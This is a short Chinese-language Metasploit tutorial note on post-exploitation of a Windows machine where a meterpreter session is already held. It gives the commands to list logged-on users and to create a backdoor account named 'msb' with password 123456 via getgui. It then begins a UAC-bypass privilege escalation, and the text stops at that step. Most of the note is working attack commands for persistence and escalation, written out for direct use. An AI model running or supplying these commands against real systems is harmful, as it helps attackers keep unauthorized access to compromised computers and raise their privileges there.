一、环境准备

1 MSF-Metasploit Framework

2 一台获取到meterpreter的靶机

二、实际操作

1、先看下目标靶机已存在用户  meterpreter中输入：run post/windows/gather/enum_logged_on_users

![[1643108073546.png]]

2、使用getgui创建 一个用户名为 msb  密码为 123456  的账户

run getgui -u msb -p 123456

run getgui -u {用户名}-p {密码}

进入win的运行输入netplwiz 可以查看账户创建情况

![[1643108092979.png]]

[-] Insufficient privileges, account was not be created. 看到这个提示就需要先提权（获取到system）

2.1 绕过UAC提权

use exploit/windows/local/*ask*